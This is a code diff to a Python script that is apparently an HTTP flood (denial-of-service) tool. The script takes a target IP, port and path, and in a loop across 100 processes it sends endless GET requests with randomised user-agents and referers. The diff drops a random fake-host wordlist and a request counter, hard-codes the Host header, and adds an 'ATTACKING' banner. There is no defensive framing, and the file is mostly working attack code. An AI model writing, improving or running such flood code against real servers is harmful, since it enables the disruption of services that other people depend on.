@@ -11,7 +11,6 @@ ip = ""
 port = 80
 period = 10
 path = ""
-num_sent = 0
 for n,args in enumerate(sys.argv):
     if args=="-i":
         ip = str(sys.argv[n+1])
@@ -21,6 +20,7 @@ for n,args in enumerate(sys.argv):
         path = str(sys.argv[n+1])
 
 Choice = random.choice
+
 useragents = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
@@ -81,29 +81,6 @@ referers = [
 	"https://www.google.co.ao/search?q=",
 ]
 
-wordlist = [
-    "detonator",
-    "concept",
-    "enjoy",
-    "equation",
-    "afterwards",
-    "flavoring",
-    "hoaxer",
-    "disbeliever",
-    "wreck",
-    "abuse",
-    "belly",
-    "halfway",
-    "grieving",
-    "fortress",
-    "hobby",
-    "consumer",
-    "courageous",
-    "amnesia",
-    "weapon",
-    "chicken",
-]
-
 def rqheader():
     connection = "Connection: keep-alive\r\n"
     accept = Choice(acceptall)
@@ -115,16 +92,14 @@ def rqheader():
     return header
 
 def attack():
-    global num_sent
     header = rqheader()
     go.wait()
     while True:
-        get_host = "GET " + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + Choice(wordlist) + str(random.randint(0,200)) + ".com" +":"+str(port)+ "\r\n"
+        get_host = "GET " + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + "google.com" +":"+str(port)+ "\r\n"
         request = get_host + header
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
-        num_sent = num_sent + 1
-        print("[+] Sent ", num_sent, " => ", ip , ":", port)
+
         if port == 443:
             x = ssl.wrap_socket(s)
             try:
@@ -158,4 +133,5 @@ def build_process(process_num):
 
 go = threading.Event()
 build_process(100)
+print("[ATTACKING!!!]")
 time.sleep(period)
